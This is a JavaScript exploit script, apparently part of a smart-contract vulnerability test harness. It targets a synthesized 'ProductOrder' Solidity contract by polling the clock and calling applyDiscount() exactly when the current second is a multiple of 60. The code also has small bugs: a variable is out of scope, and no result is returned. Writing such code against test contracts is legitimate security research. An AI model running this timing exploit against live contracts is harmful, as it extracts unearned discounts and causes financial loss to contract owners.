require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');
const { sleep } = require('@lib/os/process');

const { createLoggerWeb3 } = require('@lib/web3/deploy');


const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
let contractFileFullName = 'ProductOrder-14.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');



async function exploit(web3, envInfo, contractAddress) {
    try {   
        let solcVersion = extractSolcVersion(source);
        let { abi } = await compileWithVersion(source, contractFileFullName, 'ProductOrder', solcVersion);
        
        let contractInstance = new web3.eth.Contract(abi, contractAddress);

        console.log("Monitoring time to apply discount at specific seconds...");

        // Monitor the blockchain to execute applyDiscount at the specific second
        let interval = setInterval(async () => {
            let currentTime = Math.floor(Date.now() / 1000);
            if (currentTime % 60 === 0) {  // Check for the special time condition
                try {
                    let receipt = await contractInstance.methods.applyDiscount().send({
                        from: web3.eth.accounts.wallet[0].address,
                        gas: 3000000
                    });
                    await sleep(200);

                    if (receipt.status) {
                        console.log(`Discount applied successfully at exact second: ${currentTime}`);
                        let newPrice = await contractInstance.methods.price().call();
                        console.log(`New price after discount: ${web3.utils.fromWei(newPrice, 'ether')} ether`);

                        clearInterval(interval); // Stop after successful execution
                    }
                } catch (error) {
                    console.log("Attempt failed, trying again next minute:", error.message);
                }
            }
        }, 1000);  // Check every second
    } catch (error) {
        console.error("Failed to execute exploit due to:", error.stack);
        clearInterval(interval);
        return false;
    }
}


module.exports = async function runTests(web3, envInfo, contractAddress) {
    web3 = await createLoggerWeb3(web3);
    let result = await exploit(web3, envInfo, contractAddress);
    console.log(chalk.blue(`Result of running the exploit is: ${result}`));
    return result; 
}
